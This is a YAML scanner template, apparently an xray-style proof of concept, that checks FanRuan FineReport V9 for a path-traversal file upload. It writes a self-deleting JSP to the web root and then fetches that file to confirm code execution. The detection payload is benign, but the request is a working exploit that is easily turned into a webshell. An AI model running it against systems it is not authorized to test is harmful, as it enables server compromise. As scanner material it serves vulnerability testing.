name: poc-yaml-fanruan-v9-file-upload
binding: 278ff9de-56bd-4e14-ae4f-29c8667f1d2d
manual: true
detail:
    author: Aurora
    links:
        - https://github.com/YinWC/2021hvv_vul/blob/master/0408/%E5%B8%86%E8%BD%AF%20V9getshell%20FineReport%20V9.md
    vulnerability:
        id: CT-474069
        level: high
    warning: 该脚本会上传文件产生一个临时的无害文件，同时能够执行自删除逻辑，但是可能删除不成功
transport: http
set:
    rand: md5(randomLowercase(20))
    rFilename: randomLowercase(6)
rules:
    r0:
        request:
            method: POST
            headers:
                Content-Type: text/xml;charset=UTF-8
            path: /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/{{rFilename}}.svg.jsp
            body: '{"__CONTENT__":"<%out.println(\"{{rand}}\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>","__CHARSET__":"UTF-8"}'
        expression: response.status == 200
    r1:
        request:
            method: GET
            path: /WebReport/{{rFilename}}.svg.jsp
        expression: response.status == 200 && response.body.bcontains(bytes(rand))
expression: r0() && r1()
